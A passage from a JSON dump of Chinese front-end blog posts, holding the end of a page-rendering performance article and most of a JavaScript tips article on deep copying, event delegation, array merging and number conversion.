class=\"hljs-string\"\u003e\"path/main.css\"\u003c/span\u003e;\n\u0026lt;/style\u0026gt;\n\n\u0026lt;!--推荐--\u0026gt;\n\u0026lt;link rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"//cdn1.domain.com/path/main.css\"\u003c/span\u003e\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e页面渲染类\u003c/h2\u003e\n\u003ch4 class=\"heading\"\u003e1. 把 CSS 资源引用放到 HTML 文件顶部\u003c/h4\u003e\n\u003cp\u003e一般推荐将所有 \u003cstrong\u003eCSS\u003c/strong\u003e 资源尽早指定在 \u003cstrong\u003eHTML\u003c/strong\u003e 文档 \u003ccode\u003e\u0026lt;head\u0026gt;\u003c/code\u003e 中，这样浏览器可以优先加载 \u003cstrong\u003eCSS\u003c/strong\u003e 并尽早完成页面渲染。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e2.\u003cstrong\u003eJavaScript\u003c/strong\u003e 资源引用放到 \u003cstrong\u003eHTML\u003c/strong\u003e 文件底部\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eJavaScript\u003c/strong\u003e 资源放到 \u003cstrong\u003eHTML\u003c/strong\u003e 文档底部可以防止 \u003cstrong\u003eJavaScript\u003c/strong\u003e 的加载和解析执行对页面渲染造成阻塞。由于 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞 \u003cstrong\u003eHTML DOM\u003c/strong\u003e 解析和 \u003cstrong\u003eCSS\u003c/strong\u003e 渲染的过程。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e3.不要在 \u003cstrong\u003eHTML\u003c/strong\u003e 中直接缩放图片\u003c/h4\u003e\n\u003cp\u003e在 \u003cstrong\u003eHTML\u003c/strong\u003e 中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e4.减少 \u003cstrong\u003eDOM\u003c/strong\u003e 元素数量和深度\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eHTML\u003c/strong\u003e 中标签元素越多，标签的层级越深，浏览器解析 ** DOM** 并绘制到浏览器中所花的时间就越长，所以应尽可能保持 \u003cstrong\u003eDOM\u003c/strong\u003e 元素简洁和层级较少。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u0026lt;!--不推荐--\u0026gt;\n\u0026lt;div\u0026gt;\n    \u0026lt;span\u0026gt;\n        \u0026lt;a href=\u003cspan class=\"hljs-string\"\u003e\"javascript: void(0);\"\u003c/span\u003e\u0026gt;\n            \u0026lt;img src=\u003cspan class=\"hljs-string\"\u003e\"./path/photo.jpg\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"图片\"\u003c/span\u003e\u0026gt;\n        \u0026lt;/a\u0026gt;\n    \u0026lt;/span\u0026gt;\n\u0026lt;/div\u0026gt;\n\n\u0026lt;!--推荐--\u0026gt;\n\u0026lt;img src=\u003cspan class=\"hljs-string\"\u003e\"./path/photo.jpg\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"图片\"\u003c/span\u003e\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003e5.尽量避免使用 \u0026lt;table\u0026gt;、\u0026lt;iframe\u0026gt;等慢元素\u003c/h4\u003e\n\u003cp\u003e\u0026lt;table\u0026gt;内容的渲染是将 \u003cstrong\u003etable\u003c/strong\u003e 的 \u003cstrong\u003eDOM\u003c/strong\u003e 渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素 \u0026lt;ul\u0026gt; 代替。尽量使用异步的方式动态添加 \u003cstrong\u003eiframe\u003c/strong\u003e 内资源的下载进程会阻塞父页面静态资源的下载与 \u003cstrong\u003eCSS\u003c/strong\u003e 及 \u003cstrong\u003eHTML DOM\u003c/strong\u003e的解析。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e6.避免运行耗时的 Javascript\u003c/h4\u003e\n\u003cp\u003e长时间运行的 \u003cstrong\u003eJavaScript\u003c/strong\u003e 会阻塞浏览器构建 \u003cstrong\u003eDOM\u003c/strong\u003e 树、\u003cstrong\u003eDOM\u003c/strong\u003e 渲染树、渲染页面。所以，任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和 \u003cstrong\u003eJavaScript\u003c/strong\u003e 资源的异步加载思路是一致的。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e7.避免使用 CSS 表达式或  CSS 滤镜\u003c/h4\u003e\n\u003cp\u003e\u003cstrong\u003eCSS\u003c/strong\u003e 表达式或 \u003cstrong\u003eCSS\u003c/strong\u003e 滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//不推荐\n.opacity{\n    filter:progid:DXImageTransform.Microsoft.Alpha(opacity=50);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e关于桌面浏览器页面优化的常用技术和思路主要包括以上这些，尽管列出很多，但仍可能有少数遗漏，可见前端性能优化不是一件简简单单的事情，其涉及的内容很多。大家可以根据实际情况将这些方法应用到自己的项目当中，要想全部做到几乎是不可能的，但做到用户可接受的原则还是很容易实现的。欢迎大家加入QQ 前端技术交流群 \u003ccode\u003e544587175\u003c/code\u003e,技术来自于交流。\u003c/p\u003e\n","buildTime":"1514973720.381","__v":0}
{"_id":{"$oid":"5a4cc38885472a29ac40336d"},"id":"5a0c199851882531926e4297","author":{"$oid":"5a4b765a751bf823c002e90b"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/11/15/15fbf444b153bd43?w=800\u0026h=98\u0026f=png\u0026s=12867","https://user-gold-cdn.xitu.io/2017/11/15/15fbf444e6487915?w=800\u0026h=149\u0026f=png\u0026s=18209","https://user-gold-cdn.xitu.io/2017/11/15/15fbf444e2d6a43b?w=800\u0026h=156\u0026f=png\u0026s=17324","https://user-gold-cdn.xitu.io/2017/11/15/15fbf444ea8bca2c?w=800\u0026h=141\u0026f=png\u0026s=21038","https://user-gold-cdn.xitu.io/2017/11/15/15fbf444a56dc84e?w=800\u0026h=133\u0026f=png\u0026s=20360","https://user-gold-cdn.xitu.io/2017/11/15/15fbf444ed94451a?w=397\u0026h=398\u0026f=png\u0026s=4075","https://user-gold-cdn.xitu.io/2017/11/15/15fbf4453fd37b0a?w=370\u0026h=398\u0026f=png\u0026s=86199","https://user-gold-cdn.xitu.io/2017/11/15/15fbf4453fbde66a?w=800\u0026h=596\u0026f=gif\u0026s=151703","https://user-gold-cdn.xitu.io/2017/11/15/15fbf445673b76fc?w=800\u0026h=596\u0026f=gif\u0026s=383244","https://user-gold-cdn.xitu.io/2017/11/15/15fbf44576a04947?w=800\u0026h=596\u0026f=gif\u0026s=194818"],"screenShot":null}],"title":"JavaScript 实用技巧和写法建议","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"从大学到现在，接触前端已经有几年了，感想方面，就是对于程序员而言，想要提高自己的技术水平和编写易于阅读和维护的代码，我觉得不能每天都是平庸的写代码，更要去推敲，去摸索和优化代码，总结当中的技巧，积极听取别人的建议，这样自己的技术水平会提高的更快。那么今天，我在这里就分享一下关于…","content":"\u003ch2\u003e1.前言\u003c/h2\u003e\u003cp\u003e从大学到现在，接触前端已经有几年了，感想方面，就是对于程序员而言，想要提高自己的技术水平和编写易于阅读和维护的代码，我觉得不能每天都是平庸的写代码，更要去推敲，去摸索和优化代码，总结当中的技巧，积极听取别人的建议，这样自己的技术水平会提高的更快。那么今天，我在这里就分享一下关于javascript方面的写作的实用技巧和建议，这些技巧和建议是我平常在开发项目上会用到的，希望能让大家学到知识，更希望能起到一个交流意见的作用，也就是说大家有什么好的技巧或者建议，欢迎分享，或者觉得我的想法存在什么问题，欢迎指出!\u003c/p\u003e\u003ch2\u003e2.更短的数组去重写法\u003c/h2\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e[...new Set([2,\u003cspan class=\"hljs-string\"\u003e\"12\"\u003c/span\u003e,2,12,1,2,1,6,12,13,6])]\n//[2, \u003cspan class=\"hljs-string\"\u003e\"12\"\u003c/span\u003e, 12, 1, 6, 13]\n//es6的新特性\n\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e3.对象深浅拷贝\u003c/h2\u003e\u003cp\u003e关于对象的深浅拷贝，我个人见解就是有一下几点：\u003c/p\u003e\u003cp\u003e1.深拷贝和浅拷贝只针对像Object, Array这样的引用类型数据。\u003c/p\u003e\u003cp\u003e2.浅拷贝是对对象引用地址进行拷贝，并没有开辟新的栈，也就是拷贝后的结果是两个对象指向同一个引用地址，修改其中一个对象的属性，则另一个对象的属性也会改变。\u003c/p\u003e\u003cp\u003e3.深拷贝则是开启一个新的栈，两个对象对应两个不同的引用地址，修改一个对象的属性，不会改变另一个对象的属性。\u003c/p\u003e\u003ch3\u003e浅拷贝\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar myInfo={name:\u003cspan class=\"hljs-string\"\u003e'守候'\u003c/span\u003e,sex:\u003cspan class=\"hljs-string\"\u003e'男'\u003c/span\u003e};\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444b153bd43?w=800\u0026amp;h=98\u0026amp;f=png\u0026amp;s=12867\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar newInfo=myInfo;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444e6487915?w=800\u0026amp;h=149\u0026amp;f=png\u0026amp;s=18209\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003enewInfo.sex=\u003cspan class=\"hljs-string\"\u003e'女'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444e2d6a43b?w=800\u0026amp;h=156\u0026amp;f=png\u0026amp;s=17324\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econsole.log(myInfo)   //{name: \u003cspan class=\"hljs-string\"\u003e\"守候\"\u003c/span\u003e, sex: \u003cspan class=\"hljs-string\"\u003e\"女\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3\u003e假-深拷贝\u003c/h3\u003e\u003cp\u003e假-深拷贝这个是自己随性命名的，大家看看就好，别当真！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar myInfo={name:\u003cspan class=\"hljs-string\"\u003e'守候'\u003c/span\u003e,sex:\u003cspan class=\"hljs-string\"\u003e'男'\u003c/span\u003e};\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444b153bd43?w=800\u0026amp;h=98\u0026amp;f=png\u0026amp;s=12867\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar newInfo=Object.assign({},myInfo)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444ea8bca2c?w=800\u0026amp;h=141\u0026amp;f=png\u0026amp;s=21038\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003enewInfo.sex=\u003cspan class=\"hljs-string\"\u003e'女'\u003c/span\u003e;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444a56dc84e?w=800\u0026amp;h=133\u0026amp;f=png\u0026amp;s=20360\"\u003e\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econsole.log(myInfo)   //{name: \u003cspan class=\"hljs-string\"\u003e\"守候\"\u003c/span\u003e, sex: \u003cspan class=\"hljs-string\"\u003e\"男\"\u003c/span\u003e}\nconsole.log(newInfo)   //{name: \u003cspan class=\"hljs-string\"\u003e\"守候\"\u003c/span\u003e, sex: \u003cspan class=\"hljs-string\"\u003e\"女\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3\u003e真-深拷贝\u003c/h3\u003e\u003cp\u003e真-深拷贝这个是自己随性命名的，大家看看就好，别当真！\u003c/p\u003e\u003cp\u003e看着深浅拷贝，区别写法很简单，但是那个上面的深拷贝写法是有问题的。看下面案例\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr=[{a:1,b:2},{a:3,b:4}]\nvar newArr=Object.assign([],arr)\n//截断数组\nnewArr.length=1\nconsole.log(newArr)//[{a:1,b:2}]\nconsole.log(arr)//[{a:1,b:2},{a:3,b:4}]\n//操作newArr，这里看着对arr没影响，实际上已经挖了一个坑，下面就跳进去\nnewArr[0].a=123\n//修改newArr[0]这个对象，也是影响了arr[0]这个对象\nconsole.log(arr[0])//{a: 123, b: 2}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e为什么会这样呢，因为Object.assign并不是深拷贝，是披着深拷贝外衣的浅拷贝。最多也是Object.assign会课拷贝第一层的值，对于第一层的值都是深拷贝，而到第二层的时候就是 复制引用。类似的情况还有，slice方法和concat方法等。\u003cbr\u003e要解决这个问题，就得自己封装方法！如下\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//利用递归来实现深拷贝，如果对象属性的值是引用类型（Array,Object），那么对该属性进行深拷贝，直到遍历到属性的值是基本类型为止。  \n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e deepClone(obj){    \n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(!obj\u0026amp;\u0026amp; typeof obj!== \u003cspan class=\"hljs-string\"\u003e'object'\u003c/span\u003e){      \n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e;    \n  }    \n  var newObj= obj.constructor === Array ? [] : {};    \n  \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var key \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e obj){       \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(obj[key]){          \n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(obj[key] \u0026amp;\u0026amp; typeof obj[key] === \u003cspan class=\"hljs-string\"\u003e'object'\u003c/span\u003e){  \n        newObj[key] = obj[key].constructor === Array ? [] : {}; \n        //递归\n        newObj[key] = deepClone(obj[key]);          \n      }\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{            \n        newObj[key] = obj[key];         \n      }       \n    }    \n  }    \n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e newObj; \n}\nvar arr=[{a:1,b:2},{a:3,b:4}]\nvar newArr=deepClone(arr)\nconsole.log(arr[0])//{a:1,b:2}\nnewArr[0].a=123\nconsole.log(arr[0])//{a:1,b:2}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e还有一个方法就是简单粗暴法，我现在在用的一个方法！原理很简单，就是先把对象转成字符串，再把字符串转成对象！也能实现同样效果\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar newArr2=JSON.parse(JSON.stringify(arr));\nconsole.log(arr[0])//{a:1,b:2}\nnewArr2[0].a=123\nconsole.log(arr[0])//{a:1,b:2}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面所说的浅拷贝，真假深拷贝（自己随性命名的），这几种情况，在开发上都有可能要用到，至于要使用哪一种方式，视情况而定！\u003c/p\u003e\u003ch2\u003e4.使用事件委托\u003c/h2\u003e\u003cp\u003e一个简单的需求，比如想给ul下面的li加上点击事件，点击哪个li，就显示那个li的innerHTML。这个貌似很简单！代码如下！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n        \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\n    \u0026lt;/head\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;ul id=\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e\u0026gt;\n            \u0026lt;li\u0026gt;0\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;1\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;2\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;3\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;4\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;5\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;6\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;7\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;8\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;9\u0026lt;/li\u0026gt;\n        \u0026lt;/ul\u0026gt;\n    \u0026lt;/body\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n        var oUl=document.getElementById(\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e);\n        var oLi=oUl.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e\"li\"\u003c/span\u003e);\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=oLi.length;i\u0026lt;len;i++){\n            oLi[i].addEventListener(\u003cspan class=\"hljs-string\"\u003e\"click\"\u003c/span\u003e,\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n                alert(this.innerHTML)\n            })\n        }\n    \u0026lt;/script\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e很简单，这样就实现了，实际上这里有坑，也待优化！\u003cbr\u003e1.for循环，循环的是li，10个li就循环10次，绑定10次事件，100个就循环了100次，绑定100次事件！\u003cbr\u003e2.如果li不是本来就在页面上的，是未来元素，是页面加载了，再通过js动态加载进来了，上面的写法是无效的，点击li是没有反应的！\u003cbr\u003e所以就者需要用事件委托（即使不考虑上面的第二种情况，也是建议使用事件委托）！代码如下\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u0026lt;!DOCTYPE html\u0026gt;\n\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u0026gt;\n        \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\n    \u0026lt;/head\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;ul id=\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e\u0026gt;\n            \u0026lt;li\u0026gt;0\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;1\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;2\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;3\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;4\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;5\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;6\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;7\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;8\u0026lt;/li\u0026gt;\n            \u0026lt;li\u0026gt;9\u0026lt;/li\u0026gt;\n        \u0026lt;/ul\u0026gt;\n    \u0026lt;/body\u0026gt;\n    \u0026lt;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e\u0026gt;\n        var oUl=document.getElementById(\u003cspan class=\"hljs-string\"\u003e\"ul-test\"\u003c/span\u003e);\n        oUl.addEventListener(\u003cspan class=\"hljs-string\"\u003e\"click\"\u003c/span\u003e,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(ev){\n            var ev=ev||window.event;\n            var target=ev.target||ev.srcElement;\n            //如果点击的最底层是li元素\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(target.tagName.toLowerCase()===\u003cspan class=\"hljs-string\"\u003e'li'\u003c/span\u003e){\n                alert(target.innerHTML)\n            }\n        })\n    \u0026lt;/script\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样写，即使是动态添加进来的li点击也有反应，还有一个就是ul只有一个，事件绑定在ul上，无论li多少个，都是添加一次事件！但是也是可能会有问题，如果li下面还有子元素，那么点击的时候，target可能不是li，而是鼠标点击那个位置的最底层元素！如下图，如果鼠标点击白色区域，那个target就是body元素,鼠标点击绿色区域target就是div元素，鼠标点击蓝色区域target就是ul，点击橙色就是li。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf444ed94451a?w=397\u0026amp;h=398\u0026amp;f=png\u0026amp;s=4075\"\u003e\u003c/p\u003e\u003ch2\u003e5.使用对象作为函数参数\u003c/h2\u003e\u003cp\u003e大家试想下这样一个函数--函数接受几个参数，但是这几个参数都不是必填的，函数该怎么处理？是不是下面这样\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(name,phone,card){\n    ...\n}\n//以上函数，可以任意传参数。比如我想传card等于1472586326。这下是不是这样写\npersonInfo(\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'1472586326'\u003c/span\u003e)\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e有没有觉得上面写法奇怪，不太优雅？下面这里看着舒服一点！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(opt){\n    ...\n}\npersonInfo({card:\u003cspan class=\"hljs-string\"\u003e'1472586326'\u003c/span\u003e})\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再想一下，如果一个函数，参数很多，怎么处理？\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e(arg1,arg2,arg3,arg4,arg5,arg6,arg7){\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e密集恐惧症复发没有复发？下面这样看着会舒服一点！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(opt){\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后再想一下，如果需求改了，操作函数也要改！函数也要增加一个参数。\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//原来函数\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(name,phone,card){\n    ...\n}\n//修改后\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(name,age,phone,card){\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样就是参数修改一次，函数的参数就要修改一次！如果是用对象，就不会出现这样问题！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//修改前后都是这样，变得是函数的操作内容和调用时候的传参！\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e personInfo(opt){\n    ...\n}\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看了上面的几个栗子，总结来说，就是当函数的参数不固定的时候，参数多(三个或者三个以上)的时候，建议用一个对象记录参数，这样会比较方便，也为以后如果参数要改留了条后路！\u003c/p\u003e\u003ch2\u003e6.使用push和apply合并数组\u003c/h2\u003e\u003cp\u003e合并数组这个已经是老生常谈的话题了，方法也是多种多样！\u003c/p\u003e\u003ch3\u003econcat\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr1=[1,2,3,4,5],arr2=[6,7,8,9,10];\narr1=arr1.concat(arr2)\nconsole.log(arr1)//[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\u003c/code\u003e\u003c/pre\u003e\u003cp\u003econcat会一个全新的数组，表示arr1和arr2两个数组的组合，并让arr1和arr2不变。简单吧？\u003cbr\u003e但如果arr1和arr2的长度都很长，那就产生了一个很长很长的数组，内存又被占用了那么多。但是数组长度没限制！\u003c/p\u003e\u003ch3\u003efor\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr1=[1,2,3,4,5],arr2=[6,7,8,9,10];\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=arr2.length;i\u0026lt;len;i++){\n    arr1.push(arr2[i])\n}\nconsole.log(arr1)//[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里是往arr1循环添加arr2的元素，但是有一个情况，arr1的长度远小于arr2的长度，是不是循环arr1性能更好，循环次数更少。处理这个很简单，但是万一不知道arr1和arr2到底哪个长度更少呢？而且，for循环不够优雅！（当然，这个可以用迭代方法来替代）\u003c/p\u003e\u003ch3\u003ereduce\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr1=[1,2,3,4,5],arr2=[6,7,8,9,10];\narr1 = arr2.reduce( \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(coll,item){\n     coll.push( item );\n     \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e coll;\n }, arr1 );\n console.log(arr1)//[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e逼格高了一点，而且用ES6的箭头函数还可以减少一些代码量，但它仍然需要一个函数，每个元素都需要调用一次。\u003c/p\u003e\u003ch3\u003epush.apply\u003c/h3\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arr1=[1,2,3,4,5],arr2=[6,7,8,9,10];\narr1.push.apply(arr1,arr2);\nconsole.log(arr1)//[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e逼格看着高，代码少，也不会产生新的数组，也不难理解，就是调用\u003ccode\u003earr1.push\u003c/code\u003e这个函数实例的\u003ccode\u003eapply\u003c/code\u003e方法，同时把\u003ccode\u003earr2\u003c/code\u003e当作参数传入，这样\u003ccode\u003earr1.push\u003c/code\u003e这个方法就会遍历\u003ccode\u003earr2\u003c/code\u003e数组的所有元素，达到合并的效果。相当于\u003ccode\u003earr1.push.apply(arr1,[6,7,8,9,10]);\u003c/code\u003e，最后相当于\u003ccode\u003earr1.push(6,7,8,9,10)\u003c/code\u003e。遗憾的就是，这个方法对数组长度有限制，网上说法是不同浏览器，不同的长度限制，一般不超过10万！\u003c/p\u003e\u003cp\u003e之前是建议用push.apply，但是现在保留意见，就是大家觉得哪个方式用哪个方式！这个没有一定的对错！\u003c/p\u003e\u003ch2\u003e7.toFixed保留整数\u003c/h2\u003e\u003cp\u003e在开发上，经常会遇到最多保留多少位小数或者类似的问题，针对这个，使用toFixed可以很简单的解决问题，但是如果数据是要和后台交互的，而且后台存储的数据一般是保存数字类型，而使用toFixed后生成的是一个字符串，这下，就需要把toFixed生成的是一个字符串转成数字类型，转发很多。今天我说一个最简单--+。代码如下\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar a=123.36896335.toFixed(2)\nconsole.log(a)//\u003cspan class=\"hljs-string\"\u003e'123.37'\u003c/span\u003e\na=+a\nconsole.log(a)//123.37\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ePS：a=a|0和~~a也可以实现，但是生成的是一个整数，如下\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar a=123.36896335.toFixed(2)\nconsole.log(a)//\u003cspan class=\"hljs-string\"\u003e'123.37'\u003c/span\u003e\na=a|0  \nconsole.log(a)//123 \n//---------------------------------分割线\nvar a=123.36896335.toFixed(2)\nconsole.log(a)//\u003cspan class=\"hljs-string\"\u003e'123.37'\u003c/span\u003e\na=~~a  \nconsole.log(a)//123        \n\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e8.其它类型数据转布尔数据\u003c/h2\u003e\u003cp\u003e下面的转换，大家一看就明白了，不多说。\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econsole.log(!!\u003cspan class=\"hljs-string\"\u003e'123'\u003c/span\u003e)\n//\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n!!12\n//\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n!!-1\n//\u003cspan 